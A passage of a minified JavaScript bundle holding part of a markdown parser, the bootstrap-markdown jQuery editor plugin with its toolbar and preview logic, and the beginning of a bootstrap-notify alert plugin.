r[0].splice(1, 0, o)), n) o[a] = n[a]; return r } }, I.dialects.Maruku.block.definition_list = function (t, e) { var n = /^((?:[^\s:].*\n)+):\s+([\s\S]+)$/, i = ["dl"]; if (s = t.match(n)) { for (var o = [t]; e.length && n.exec(e[0]);)o.push(e.shift()); for (var a = 0; a < o.length; ++a) { for (var s, r = (s = o[a].match(n))[1].replace(/\n$/, "").split(/\n/), g = s[2].split(/\n:\s+/), l = 0; l < r.length; ++l)i.push(["dt", r[l]]); for (l = 0; l < g.length; ++l)i.push(["dd"].concat(this.processInline(g[l].replace(/(\n)\s+/, "$1")))) } return [i] } }, I.dialects.Maruku.block.table = function (t, e) { function n(t, e) { (e = e || "\\s").match(/^[\\|\[\]{}?*.+^$]$/) && (e = "\\" + e); for (var n, i = [], o = new RegExp("^((?:\\\\.|[^\\\\" + e + "])*)" + e + "(.*)"); n = t.match(o);)i.push(n[1]), t = n[2]; return i.push(t), i } var i, o; if (o = t.match(/^ {0,3}\|(.+)\n {0,3}\|\s*([\-:]+[\-| :]*)\n((?:\s*\|.*(?:\n|$))*)(?=\n|$)/)) o[3] = o[3].replace(/^\s*\|/gm, ""); else if (!(o = t.match(/^ {0,3}(\S(?:\\.|[^\\|])*\|.*)\n {0,3}([\-:]+\s*\|[\-| :]*)\n((?:(?:\\.|[^\\|])*\|.*(?:\n|$))*)(?=\n|$)/))) return; var a = ["table", ["thead", ["tr"]], ["tbody"]]; o[2] = o[2].replace(/\|\s*$/, "").split("|"); var s = []; for (X(o[2], function (t) { t.match(/^\s*-+:\s*$/) ? s.push({ align: "right" }) : t.match(/^\s*:-+\s*$/) ? s.push({ align: "left" }) : t.match(/^\s*:-+:\s*$/) ? s.push({ align: "center" }) : s.push({}) }), o[1] = n(o[1].replace(/\|\s*$/, ""), "|"), i = 0; i < o[1].length; i++)a[1][1].push(["th", s[i] || {}].concat(this.processInline(o[1][i].trim()))); return X(o[3].replace(/\|\s*$/gm, "").split("\n"), function (t) { var e = ["tr"]; for (t = n(t, "|"), i = 0; i < t.length; i++)e.push(["td", s[i] || {}].concat(this.processInline(t[i].trim()))); a[2].push(e) }, this), [a] }, I.dialects.Maruku.inline["{:"] = function (t, e, n) { if (!n.length) return [2, "{:"]; var i = n[n.length - 1]; if ("string" == typeof i) return [2, "{:"]; var o = t.match(/^\{:\s*((?:\\\}|[^\}])*)\s*\}/); if (!o) return [2, "{:"]; var a = this.dialect.processMetaHash(o[1]), s = h(i); for (var r in s || (s = {}, i.splice(1, 0, s)), a) s[r] = a[r]; return [o[0].length, ""] }, I.dialects.Maruku.inline.__escape__ = /^\\[\\`\*_{}\[\]()#\+.!\-|:]/, I.buildBlockOrder(I.dialects.Maruku.block), I.buildInlinePatterns(I.dialects.Maruku.inline); var l = Array.isArray || function (t) { return "[object Array]" == Object.prototype.toString.call(t) }, X = Array.prototype.forEach ? function (t, e, n) { return t.forEach(e, n) } : function (t, e, n) { for (var i = 0; i < t.length; i++)e.call(n || t, t[i], i, t) }, u = function (t) { for (var e in t) if (hasOwnProperty.call(t, e)) return !1; return !0 }; function h(t) { return l(t) && 1 < t.length && "object" == typeof t[1] && !l(t[1]) ? t[1] : void 0 } function c(t) { return t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;") } function d(t) { if ("string" == typeof t) return c(t); var e = t.shift(), n = {}, i = []; for (!t.length || "object" != typeof t[0] || t[0] instanceof Array || (n = t.shift()); t.length;)i.push(d(t.shift())); var o = ""; for (var a in n) o += " " + a + '="' + c(n[a]) + '"'; return "img" == e || "br" == e || "hr" == e ? "<" + e + o + "/>" : "<" + e + o + ">" + i.join("") + "</" + e + ">" } o.renderJsonML = function (t, e) { (e = e || {}).root = e.root || !1; var n = []; if (e.root) n.push(d(t)); else for (t.shift(), !t.length || "object" != typeof t[0] || t[0] instanceof Array || t.shift(); t.length;)n.push(d(t.shift())); return n.join("\n\n") } }("undefined" == typeof exports ? (window.markdown = {}, window.markdown) : exports), function (t) { "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof exports ? t(require("jquery")) : t(jQuery) }(function (B) { "use strict"; function o(n, i) { B.each(["autofocus", "savable", "hideable", "width", "height", "resize", "iconlibrary", "language", "footer", "fullscreen", "hiddenButtons", "disabledButtons"], function (t, e) { void 0 !== B(n).data(e) && ((i = "object" == typeof i ? i : {})[e] = B(n).data(e)) }), this.$ns = "bootstrap-markdown", this.$element = B(n), this.$editable = { el: null, type: null, attrKeys: [], attrValues: [], content: null }, this.$options = B.extend(!0, {}, B.fn.markdown.defaults, i, this.$element.data("options")), this.$oldContent = null, this.$isPreview = !1, this.$isFullscreen = !1, this.$editor = null, this.$textarea = null, this.$handler = [], this.$callback = [], this.$nextTab = [], this.showEditor() } o.prototype = { constructor: o, __alterButtons: function (n, i) { var t = this.$handler, o = "all" == n, a = this; B.each(t, function (t, e) { !1 === (!o && e.indexOf(n) < 0) && i(a.$editor.find('button[data-handler="' + e + '"]')) }) }, __buildButtons: function (t, e) { for (var n = this.$ns, i = this.$handler, o = this.$callback, a = 0; a < t.length; a++)for (var s = t[a], r = 0; r < s.length; r++) { for (var g = s[r].data, l = B("<div/>", { class: "btn-group" }), c = 0; c < g.length; c++) { var I, u = g[c], h = n + "-" + u.name, d = this.__getIcon(u.icon), C = u.btnText ? u.btnText : "", A = u.btnClass ? u.btnClass : "btn", p = u.tabIndex ? u.tabIndex : "-1", m = void 0 !== u.hotkey ? u.hotkey : "", f = void 0 !== jQuery.hotkeys && "" !== m ? " (" + m + ")" : "", b = B("<button></button>"); b.text(" " + this.__localize(C)).addClass("btn-default btn-sm").addClass(A), A.match(/btn\-(primary|success|info|warning|danger|link)/) && b.removeClass("btn-default"), b.attr({ type: "button", title: this.__localize(u.title) + f, tabindex: p, "data-provider": n, "data-handler": h, "data-hotkey": m }), !0 === u.toggle && b.attr("data-toggle", "button"), (I = B("<span/>")).addClass(d), I.prependTo(b), l.append(b), i.push(h), o.push(u.callback) } e.append(l) } return e }, __setListener: function () { var t = void 0 !== this.$textarea.attr("rows"), e = 5 < this.$textarea.val().split("\n").length ? this.$textarea.val().split("\n").length : "5", n = t ? this.$textarea.attr("rows") : e; this.$textarea.attr("rows", n), this.$options.resize && this.$textarea.css("resize", this.$options.resize), this.$textarea.on({ focus: B.proxy(this.focus, this), keyup: B.proxy(this.keyup, this), change: B.proxy(this.change, this), select: B.proxy(this.select, this) }), this.eventSupported("keydown") && this.$textarea.on("keydown", B.proxy(this.keydown, this)), this.eventSupported("keypress") && this.$textarea.on("keypress", B.proxy(this.keypress, this)), this.$textarea.data("markdown", this) }, __handle: function (t) { var e = B(t.currentTarget), n = this.$handler, i = this.$callback, o = e.attr("data-handler"), a = i[n.indexOf(o)]; B(t.currentTarget).focus(), a(this), this.change(this), o.indexOf("cmdSave") < 0 && this.$textarea.focus(), t.preventDefault() }, __localize: function (t) { var e = B.fn.markdown.messages, n = this.$options.language; return void 0 !== e && void 0 !== e[n] && void 0 !== e[n][t] ? e[n][t] : t }, __getIcon: function (t) { return "object" == typeof t ? t[this.$options.iconlibrary] : t }, setFullscreen: function (t) { var e = this.$editor, n = this.$textarea; !0 === t ? (e.addClass("md-fullscreen-mode"), B("body").addClass("md-nooverflow"), this.$options.onFullscreen(this)) : (e.removeClass("md-fullscreen-mode"), B("body").removeClass("md-nooverflow"), 1 == this.$isPreview && this.hidePreview().showPreview()), this.$isFullscreen = t, n.focus() }, showEditor: function () { var t, i, e, n, o, a, s, r, g, l = this, c = this.$ns, I = this.$element, u = (I.css("height"), I.css("width"), this.$editable), h = this.$handler, d = this.$callback, C = this.$options, A = B("<div/>", { class: "md-editor", click: function () { l.focus() } }); return null === this.$editor ? (t = B("<div/>", { class: "md-header btn-toolbar" }), i = [], 0 < C.buttons.length && (i = i.concat(C.buttons[0])), 0 < C.additionalButtons.length && B.each(C.additionalButtons[0], function (t, n) { var e = B.grep(i, function (t, e) { return t.name === n.name }); 0 < e.length ? e[0].data = e[0].data.concat(n.data) : i.push(C.additionalButtons[0][t]) }), 0 < C.reorderButtonGroups.length && (i = i.filter(function (t) { return -1 < C.reorderButtonGroups.indexOf(t.name) }).sort(function (t, e) { return C.reorderButtonGroups.indexOf(t.name) < C.reorderButtonGroups.indexOf(e.name) ? -1 : C.reorderButtonGroups.indexOf(t.name) > C.reorderButtonGroups.indexOf(e.name) ? 1 : 0 })), 0 < i.length && (t = this.__buildButtons([i], t)), C.fullscreen.enable && t.append('<div class="md-controls"><a class="md-control md-control-fullscreen" href="#"><span class="' + this.__getIcon(C.fullscreen.icons.fullscreenOn) + '"></span></a></div>').on("click", ".md-control-fullscreen", function (t) { t.preventDefault(), l.setFullscreen(!0) }), A.append(t), I.is("textarea") ? (I.before(A), (o = I).addClass("md-input"), A.append(o)) : (e = "function" == typeof toMarkdown ? toMarkdown(I.html()) : I.html(), n = B.trim(e), o = B("<textarea/>", { class: "md-input", val: n }), A.append(o), u.el = I, u.type = I.prop("tagName").toLowerCase(), u.content = I.html(), B(I[0].attributes).each(function () { u.attrKeys.push(this.nodeName), u.attrValues.push(this.nodeValue) }), I.replaceWith(A)), a = B("<div/>", { class: "md-footer" }), s = !1, C.savable && (s = !0, h.push("cmdSave"), d.push(C.onSave), a.append('<button class="btn btn-success" data-provider="' + c + '" data-handler="cmdSave"><i class="icon icon-white icon-ok"></i> ' + this.__localize("Save") + "</button>")), r = "function" == typeof C.footer ? C.footer(this) : C.footer, "" !== B.trim(r) && (s = !0, a.append(r)), s && A.append(a), C.width && "inherit" !== C.width && (jQuery.isNumeric(C.width) ? (A.css("display", "table"), o.css("width", C.width + "px")) : A.addClass(C.width)), C.height && "inherit" !== C.height && (jQuery.isNumeric(C.height) ? (g = C.height, t && (g = Math.max(0, g - t.outerHeight())), a && (g = Math.max(0, g - a.outerHeight())), o.css("height", g + "px")) : A.addClass(C.height)), this.$editor = A, this.$textarea = o, this.$editable = u, this.$oldContent = this.getContent(), this.__setListener(), this.$editor.attr("id", (new Date).getTime()), this.$editor.on("click", '[data-provider="bootstrap-markdown"]', B.proxy(this.__handle, this)), (this.$element.is(":disabled") || this.$element.is("[readonly]")) && (this.$editor.addClass("md-editor-disabled"), this.disableButtons("all")), this.eventSupported("keydown") && "object" == typeof jQuery.hotkeys && t.find('[data-provider="bootstrap-markdown"]').each(function () { var t = B(this), e = t.attr("data-hotkey"); "" !== e.toLowerCase() && o.bind("keydown", e, function () { return t.trigger("click"), !1 }) }), "preview" === C.initialstate ? this.showPreview() : "fullscreen" === C.initialstate && C.fullscreen.enable && this.setFullscreen(!0)) : this.$editor.show(), C.autofocus && (this.$textarea.focus(), this.$editor.addClass("active")), C.fullscreen.enable && !1 !== C.fullscreen && (this.$editor.append('<div class="md-fullscreen-controls"><a href="#" class="exit-fullscreen" title="Exit fullscreen"><span class="' + this.__getIcon(C.fullscreen.icons.fullscreenOff) + '"></span></a></div>'), this.$editor.on("click", ".exit-fullscreen", function (t) { t.preventDefault(), l.setFullscreen(!1) })), this.hideButtons(C.hiddenButtons), this.disableButtons(C.disabledButtons), C.onShow(this), this }, parseContent: function (t) { var t = t || this.$textarea.val(), e = this.$options.parser ? this.$options.parser(t) : "object" == typeof markdown ? markdown.toHTML(t) : "function" == typeof marked ? marked(t) : t; return e }, showPreview: function () { var t, e, n = this.$options, i = this.$textarea, o = i.next(), a = B("<div/>", { class: "md-preview", "data-provider": "markdown-preview" }); return 1 == this.$isPreview || (this.$isPreview = !0, this.disableButtons("all").enableButtons("cmdPreview"), t = "string" == typeof (e = n.onPreview(this)) ? e : this.parseContent(), a.html(t), o && "md-footer" == o.attr("class") ? a.insertBefore(o) : i.parent().append(a), a.css({ width: i.outerWidth() + "px", height: i.outerHeight() + "px" }), this.$options.resize && a.css("resize", this.$options.resize), i.hide(), a.data("markdown", this), (this.$element.is(":disabled") || this.$element.is("[readonly]")) && (this.$editor.addClass("md-editor-disabled"), this.disableButtons("all"))), this }, hidePreview: function () { return this.$isPreview = !1, this.$editor.find('div[data-provider="markdown-preview"]').remove(), this.enableButtons("all"), this.disableButtons(this.$options.disabledButtons), this.$textarea.show(), this.__setListener(), this }, isDirty: function () { return this.$oldContent != this.getContent() }, getContent: function () { return this.$textarea.val() }, setContent: function (t) { return this.$textarea.val(t), this }, findSelection: function (t) { var e; if (0 <= (e = this.getContent().indexOf(t)) && 0 < t.length) { var n, i = this.getSelection(); return this.setSelection(e, e + t.length), n = this.getSelection(), this.setSelection(i.start, i.end), n } return null }, getSelection: function () { var e = this.$textarea[0]; return ("selectionStart" in e ? function () { var t = e.selectionEnd - e.selectionStart; return { start: e.selectionStart, end: e.selectionEnd, length: t, text: e.value.substr(e.selectionStart, t) } } : function () { return null })() }, setSelection: function (t, e) { var n = this.$textarea[0]; return ("selectionStart" in n ? function () { n.selectionStart = t, n.selectionEnd = e } : function () { return null })() }, replaceSelection: function (t) { var e = this.$textarea[0]; return ("selectionStart" in e ? function () { return e.value = e.value.substr(0, e.selectionStart) + t + e.value.substr(e.selectionEnd, e.value.length), e.selectionStart = e.value.length, this } : function () { return e.value += t, jQuery(e) })() }, getNextTab: function () { if (0 === this.$nextTab.length) return null; var t, e = this.$nextTab.shift(); return "function" == typeof e ? t = e() : "object" == typeof e && 0 < e.length && (t = e), t }, setNextTab: function (t, e) { var n, i; "string" == typeof t ? (n = this).$nextTab.push(function () { return n.findSelection(t) }) : "number" == typeof t && "number" == typeof e && (i = this.getSelection(), this.setSelection(t, e), this.$nextTab.push(this.getSelection()), this.setSelection(i.start, i.end)) }, __parseButtonNameParam: function (t) { return "string" == typeof t ? t.split(" ") : t }, enableButtons: function (t) { var n = this.__parseButtonNameParam(t), i = this; return B.each(n, function (t, e) { i.__alterButtons(n[t], function (t) { t.removeAttr("disabled") }) }), this }, disableButtons: function (t) { var n = this.__parseButtonNameParam(t), i = this; return B.each(n, function (t, e) { i.__alterButtons(n[t], function (t) { t.attr("disabled", "disabled") }) }), this }, hideButtons: function (t) { var n = this.__parseButtonNameParam(t), i = this; return B.each(n, function (t, e) { i.__alterButtons(n[t], function (t) { t.addClass("hidden") }) }), this }, showButtons: function (t) { var n = this.__parseButtonNameParam(t), i = this; return B.each(n, function (t, e) { i.__alterButtons(n[t], function (t) { t.removeClass("hidden") }) }), this }, eventSupported: function (t) { var e = t in this.$element; return e || (this.$element.setAttribute(t, "return;"), e = "function" == typeof this.$element[t]), e }, keyup: function (t) { var e, n, i, o = !1; switch (t.keyCode) { case 40: case 38: case 16: case 17: case 18: break; case 9: o = null !== (e = this.getNextTab()) ? (n = this, setTimeout(function () { n.setSelection(e.start, e.end) }, 500), !0) : ((i = this.getSelection()).start != i.end || i.end != this.getContent().length) && (this.setSelection(this.getContent().length, this.getContent().length), !0); break; case 13: o = !1; break; case 27: this.$isFullscreen && this.setFullscreen(!1), o = !1; break; default: o = !1 }o && (t.stopPropagation(), t.preventDefault()), this.$options.onChange(this) }, change: function (t) { return this.$options.onChange(this), this }, select: function (t) { return this.$options.onSelect(this), this }, focus: function (t) { var e = this.$options, n = (e.hideable, this.$editor); return n.addClass("active"), B(document).find(".md-editor").each(function () { var t; B(this).attr("id") !== n.attr("id") && (null === (t = B(this).find("textarea").data("markdown")) && (t = B(this).find('div[data-provider="markdown-preview"]').data("markdown")), t && t.blur()) }), e.onFocus(this), this }, blur: function (t) { var n, e, i, o = this.$options, a = o.hideable, s = this.$editor, r = this.$editable; return !s.hasClass("active") && 0 !== this.$element.parent().length || (s.removeClass("active"), a && (null !== r.el ? (n = B("<" + r.type + "/>"), e = this.getContent(), i = this.parseContent(e), B(r.attrKeys).each(function (t, e) { n.attr(r.attrKeys[t], r.attrValues[t]) }), n.html(i), s.replaceWith(n)) : s.hide()), o.onBlur(this)), this } }; var t = B.fn.markdown; B.fn.markdown = function (i) { return this.each(function () { var t = B(this), e = t.data("markdown"), n = "object" == typeof i && i; e || t.data("markdown", e = new o(this, n)) }) }, B.fn.markdown.messages = {}, B.fn.markdown.defaults = { autofocus: !1, hideable: !1, savable: !1, width: "inherit", height: "inherit", resize: "none", iconlibrary: "glyph", language: "en", initialstate: "editor", parser: null, buttons: [[{ name: "groupFont", data: [{ name: "cmdBold", hotkey: "Ctrl+B", title: "Bold", icon: { glyph: "glyphicon glyphicon-bold", fa: "fa fa-bold", "fa-3": "icon-bold" }, callback: function (t) { var e = t.getSelection(), n = t.getContent(), i = 0 === e.length ? t.__localize("strong text") : e.text, o = "**" === n.substr(e.start - 2, 2) && "**" === n.substr(e.end, 2) ? (t.setSelection(e.start - 2, e.end + 2), t.replaceSelection(i), e.start - 2) : (t.replaceSelection("**" + i + "**"), e.start + 2); t.setSelection(o, o + i.length) } }, { name: "cmdItalic", title: "Italic", hotkey: "Ctrl+I", icon: { glyph: "glyphicon glyphicon-italic", fa: "fa fa-italic", "fa-3": "icon-italic" }, callback: function (t) { var e = t.getSelection(), n = t.getContent(), i = 0 === e.length ? t.__localize("emphasized text") : e.text, o = "_" === n.substr(e.start - 1, 1) && "_" === n.substr(e.end, 1) ? (t.setSelection(e.start - 1, e.end + 1), t.replaceSelection(i), e.start - 1) : (t.replaceSelection("_" + i + "_"), e.start + 1); t.setSelection(o, o + i.length) } }, { name: "cmdHeading", title: "Heading", hotkey: "Ctrl+H", icon: { glyph: "glyphicon glyphicon-header", fa: "fa fa-header", "fa-3": "icon-font" }, callback: function (t) { var e, n = t.getSelection(), i = t.getContent(), o = 0 === n.length ? t.__localize("heading text") : n.text + "\n", a = 4, s = "### " === i.substr(n.start - a, a) || (a = 3, "###" === i.substr(n.start - a, a)) ? (t.setSelection(n.start - a, n.end), t.replaceSelection(o), n.start - a) : 0 < n.start && ((e = i.substr(n.start - 1, 1)) && "\n" != e) ? (t.replaceSelection("\n\n### " + o), n.start + 6) : (t.replaceSelection("### " + o), n.start + 4); t.setSelection(s, s + o.length) } }] }, { name: "groupLink", data: [{ name: "cmdUrl", title: "URL/Link", hotkey: "Ctrl+L", icon: { glyph: "glyphicon glyphicon-link", fa: "fa fa-link", "fa-3": "icon-link" }, callback: function (t) { var e, n, i = t.getSelection(), o = (t.getContent(), 0 === i.length ? t.__localize("enter link description here") : i.text), a = prompt(t.__localize("Insert Hyperlink"), "https://"), s = new RegExp("^((http|https)://|(mailto:)|(//))[a-z0-9]", "i"); null !== a && "" !== a && "https://" !== a && s.test(a) && (n = B("<div>" + a + "</div>").text(), t.replaceSelection("[" + o + "](" + n + ")"), e = i.start + 1, t.setSelection(e, e + o.length)) } }, { name: "cmdImage", title: "Image", hotkey: "Ctrl+G", icon: { glyph: "glyphicon glyphicon-picture", fa: "fa fa-picture-o", "fa-3": "icon-picture" }, callback: function (t) { var e, n, i = t.getSelection(), o = (t.getContent(), 0 === i.length ? t.__localize("enter image description here") : i.text), a = prompt(t.__localize("Insert Image Hyperlink"), "https://"), s = new RegExp("^((http|https)://|(//))[a-z0-9]", "i"); null !== a && "" !== a && "https://" !== a && s.test(a) && (n = B("<div>" + a + "</div>").text(), t.replaceSelection("![" + o + "](" + n + ' "' + t.__localize("enter image title here") + '")'), e = i.start + 2, t.setNextTab(t.__localize("enter image title here")), t.setSelection(e, e + o.length)) } }] }, { name: "groupMisc", data: [{ name: "cmdList", hotkey: "Ctrl+U", title: "Unordered List", icon: { glyph: "glyphicon glyphicon-list", fa: "fa fa-list", "fa-3": "icon-list-ul" }, callback: function (t) { var n, e, i, o = t.getSelection(); t.getContent(); i = 0 === o.length ? (e = t.__localize("list text here"), t.replaceSelection("- " + e), o.start + 2) : o.text.indexOf("\n") < 0 ? (e = o.text, t.replaceSelection("- " + e), o.start + 2) : (n = [], e = (n = o.text.split("\n"))[0], B.each(n, function (t, e) { n[t] = "- " + e }), t.replaceSelection("\n\n" + n.join("\n")), o.start + 4), t.setSelection(i, i + e.length) } }, { name: "cmdListO", hotkey: "Ctrl+O", title: "Ordered List", icon: { glyph: "glyphicon glyphicon-th-list", fa: "fa fa-list-ol", "fa-3": "icon-list-ol" }, callback: function (t) { var n, e, i, o = t.getSelection(); t.getContent(); i = 0 === o.length ? (e = t.__localize("list text here"), t.replaceSelection("1. " + e), o.start + 3) : o.text.indexOf("\n") < 0 ? (e = o.text, t.replaceSelection("1. " + e), o.start + 3) : (n = [], e = (n = o.text.split("\n"))[0], B.each(n, function (t, e) { n[t] = "1. " + e }), t.replaceSelection("\n\n" + n.join("\n")), o.start + 5), t.setSelection(i, i + e.length) } }, { name: "cmdCode", hotkey: "Ctrl+K", title: "Code", icon: { glyph: "glyphicon glyphicon-asterisk", fa: "fa fa-code", "fa-3": "icon-code" }, callback: function (t) { var e = t.getSelection(), n = t.getContent(), i = 0 === e.length ? t.__localize("code text here") : e.text, o = "```\n" === n.substr(e.start - 4, 4) && "\n```" === n.substr(e.end, 4) ? (t.setSelection(e.start - 4, e.end + 4), t.replaceSelection(i), e.start - 4) : "`" === n.substr(e.start - 1, 1) && "`" === n.substr(e.end, 1) ? (t.setSelection(e.start - 1, e.end + 1), t.replaceSelection(i), e.start - 1) : -1 < n.indexOf("\n") ? (t.replaceSelection("```\n" + i + "\n```"), e.start + 4) : (t.replaceSelection("`" + i + "`"), e.start + 1); t.setSelection(o, o + i.length) } }, { name: "cmdQuote", hotkey: "Ctrl+Q", title: "Quote", icon: { glyph: "glyphicon glyphicon-comment", fa: "fa fa-quote-left", "fa-3": "icon-quote-left" }, callback: function (t) { var n, e, i, o = t.getSelection(); t.getContent(); i = 0 === o.length ? (e = t.__localize("quote here"), t.replaceSelection("> " + e), o.start + 2) : o.text.indexOf("\n") < 0 ? (e = o.text, t.replaceSelection("> " + e), o.start + 2) : (n = [], e = (n = o.text.split("\n"))[0], B.each(n, function (t, e) { n[t] = "> " + e }), t.replaceSelection("\n\n" + n.join("\n")), o.start + 4), t.setSelection(i, i + e.length) } }] }, { name: "groupUtil", data: [{ name: "cmdPreview", toggle: !0, hotkey: "Ctrl+P", title: "Preview", btnText: "Preview", btnClass: "btn btn-primary btn-sm", icon: { glyph: "glyphicon glyphicon-search", fa: "fa fa-search", "fa-3": "icon-search" }, callback: function (t) { !1 === t.$isPreview ? t.showPreview() : t.hidePreview() } }] }]], additionalButtons: [], reorderButtonGroups: [], hiddenButtons: [], disabledButtons: [], footer: "", fullscreen: { enable: !0, icons: { fullscreenOn: { fa: "fa fa-expand", glyph: "glyphicon glyphicon-fullscreen", "fa-3": "icon-resize-full" }, fullscreenOff: { fa: "fa fa-compress", glyph: "glyphicon glyphicon-fullscreen", "fa-3": "icon-resize-small" } } }, onShow: function (t) { }, onPreview: function (t) { }, onSave: function (t) { }, onBlur: function (t) { }, onFocus: function (t) { }, onChange: function (t) { }, onFullscreen: function (t) { }, onSelect: function (t) { } }, B.fn.markdown.Constructor = o, B.fn.markdown.noConflict = function () { return B.fn.markdown = t, this }; function e(t) { var e = t; e.data("markdown") ? e.data("markdown").showEditor() : e.markdown() } B(document).on("click.markdown.data-api", '[data-provide="markdown-editable"]', function (t) { e(B(this)), t.preventDefault() }).on("click focusin", function (t) { var i; i = B(document.activeElement), B(document).find(".md-editor").each(function () { var t = B(this), e = i.closest(".md-editor")[0] === this, n = t.find("textarea").data("markdown") || t.find('div[data-provider="markdown-preview"]').data("markdown"); n && !e && n.blur() }) }).ready(function () { B('textarea[data-provide="markdown"]').each(function () { e(B(this)) }) }) }), $.fn.markdown.defaults.iconlibrary = "fa", $.fn.markdown.defaults.buttons[0][0].data[2].icon.fa = "fa fa-heading", $.fn.markdown.defaults.buttons[0][1].data[1].icon.fa = "fa fa-image", $.fn.markdown.defaults.buttons[0][2].data[1].icon.fa = "fa fa-list-ol", function (t) { "function" == typeof define && define.amd ? define(["jquery"], t) : t("object" == typeof exports ? require("jquery") : jQuery) }(function (a) { function n(t, e, n) { e = { content: { message: "object" == typeof e ? e.message : e, title: e.title ? e.title : "", icon: e.icon ? e.icon : "", url: e.url ? e.url : "#", target: e.target ? e.target : "-" } }; n = a.extend(!0, {}, e, n), this.settings = a.extend(!0, {}, i, n), this._defaults = i, "-" == this.settings.content.target && (this.settings.content.target = this.settings.url_target), this.animations = { start: "webkitAnimationStart oanimationstart MSAnimationStart animationstart", end: "webkitAnimationEnd oanimationend MSAnimationEnd animationend" }, "number" == typeof this.settings.offset && (this.settings.offset = { x: this.settings.offset, y: this.settings.offset }), this.init() } var i = { element: "body", position: null, type: "info", allow_dismiss: !0, newest_on_top: !1, showProgressbar: !1, placement: { from: "top", align: "right" }, offset: 20, spacing: 10, z_index: 1031, delay: 5e3, timer: 1e3, url_target: "_blank", mouse_over: null, animate: { enter: "animated fadeInDown", exit: "animated fadeOutUp" }, onShow: null, onShown: null, onClose: null, onClosed: null, icon_type: "class", template: '<div data-notify="container" class="col-xs-11 col-sm-4 alert alert-{0}" role="alert"><button type="button" aria-hidden="true" class="close" data-notify="dismiss">&times;</button><span data-notify="icon"></span> <span data-notify="title">{1}</span> <span data-notify="message">{2}</span><div class="progress" data-notify="progressbar"><div class="progress-bar progress-bar-{0}" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width: 0%;"></div></div><a href="{3}" target="{4}" data-notify="url"></a></div>' }; String.format = function () { for (var t = arguments[0], e = 1; e < arguments.length; e++)t = t.replace(RegExp("\\{" + (e - 1) + "\\}", "gm"), arguments[e]); return t }, a.extend(n.prototype, { init: function () { var s = this; this.buildNotify(), this.settings.content.icon && this.setIcon(), "#" != this.settings.content.url && this.styleURL(), this.styleDismiss(), this.placement(), this.bind(), this.notify = { $ele: this.$ele, update: function (t, e) { var n = {}; for (var t in "string" == typeof t ? n[t] = e : n = t, n) switch (t) { case "type": this.$ele.removeClass("alert-" + s.settings.type), this.$ele.find('[data-notify="progressbar"] > .progress-bar').removeClass("progress-bar-" + s.settings.type), s.settings.type = n[t], this.$ele.addClass("alert-" + n[t]).find('[data-notify="progressbar"] > .progress-bar').addClass("progress-bar-" + n[t]); break; case "icon": var i = this.$ele.find('[data-notify="icon"]'); "class" == s.settings.icon_type.toLowerCase() ? i.removeClass(s.settings.content.icon).addClass(n[t]) : (i.is("img") || i.find("img"), i.attr("src", n[t])); break; case "progress": var o = s.settings.delay - s.settings.delay * (n[t] / 100); this.$ele.data("notify-delay", o), this.$ele.find('[data-notify="progressbar"] > div').attr("aria-valuenow", n[t]).css("width", n[t] + "%"); break; case "url": this.$ele.find('[data-notify="url"]').attr("href", n[t]); break; case "target": this.$ele.find('[data-notify="url"]').attr("target", n[t]); break; default: this.$ele.find('[data-notify="' + t + '"]').html(n[t]) }var a = this.$ele.outerHeight() + parseInt(s.settings.spacing) + parseInt(s.settings.offset.y); s.reposition(a) }, close: function () { s.close() } } }, buildNotify: function () { var t = this.settings.content; this.$ele = a(String.format(this.settings.template, this.settings.type, t.title, t.message, t.url, t.target)), this.$ele.attr("data-notify-position", this.settings.placement.from + "-" + this.settings.placement.align), this.settings.allow_dismiss || this.$ele.find('[data-notify="dismiss"]').css("display", "none"), (this.settings.delay <= 0 && !this.settings.showProgressbar || !this.settings.showProgressbar) && this.$ele.find('[data-notify="progressbar"]').remove() }, setIcon: function () { "class" == this.settings.icon_type.toLowerCase() ? this.$ele.find('[data-notify="icon"]').addClass(this.settings.content.icon) : this.$ele.find('[data-notify="icon"]').is("img") ? this.$ele.find('[data-notify="icon"]').attr("src", this.settings.content.icon) : this.$ele.find('[data-notify="icon"]').append('<img src="' + this.settings.content.icon + '" alt="Notify Icon" />') }, styleDismiss: function () { this.$ele.find('[data-notify="dismiss"]').css({ position: "absolute", right: "10px", top: "5px", zIndex: this.settings.z_index + 2 }) }, styleURL: function () { this.$ele.find('[data-notify="url"]').css({ backgroundImage: "url(data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)", height: "100%", left: "0px", position: "absolute", top: "0px", width: "100%", zIndex: this.settings.z_index + 1 }) }, placement: function () { var n = this, t = this.settings.offset.y, e = { display: "inline-block", margin: "0px auto", position: this.settings.position ? this.settings.position : "body" === this.settings.element ? "fixed" : "absolute", transition: "all .5s ease-in-out", zIndex: this.settings.z_index }, i = !1, o = this.settings; switch (a('[data-notify-position="' + this.settings.placement.from + "-" + this.settings.placement.align + '"]:not([data-closing="true"])').each(function () { return t = Math.max(t, parseInt(a(this).css(o.placement.from)) + parseInt(a(this).outerHeight()) + parseInt(o.spacing)) }), 1 == this.settings.newest_on_top && (t = this.settings.offset.y), e[this.settings.placement.from] = t + "px", this.settings.placement.align) { case "left": case "right": e[this.settings.placement.align] = this.settings.offset.x + "px"; break; case "center": e.left = 0, e.right = 0 }this.$ele.css(e).addClass(this.settings.animate.enter), a.each(Array("webkit", "moz", "o", "ms", ""), function (t, e) { n.$ele[0].style[e + "AnimationIterationCount"] = 1 }), a(this.settings.element).append(this.$ele), 1 == this.settings.newest_on_top && (t = parseInt(t) + parseInt(this.settings.spacing) + this.$ele.outerHeight(), this.reposition(t)), a.isFunction(n.settings.onShow) && n.settings.onShow.call(this.$ele), this.$ele.one(this.animations.start, function (t) { i = !0 }).one(this.animations.end, function (t) { a.isFunction(n.settings.onShown) && n.settings.onShown.call(this) }), setTimeout(function () { i || a.isFunction(n.settings.onShown) && n.settings.onShown.call(this) }, 600) }, bind: function () { var n, i = this; this.$ele.find('[data-notify="dismiss"]').on("click", function () { i.close() }), this.$ele.mouseover(function (t) { a(this).data("data-hover", "true") }).mouseout(function (t) { a(this).data("data-hover", "false") }), this.$ele.data("data-hover", "false"), 0 < this.settings.delay && (i.$ele.data("notify-delay", i.settings.delay), n = setInterval(function () { var t, e = parseInt(i.$ele.data("notify-delay")) - i.settings.timer; ("false" === 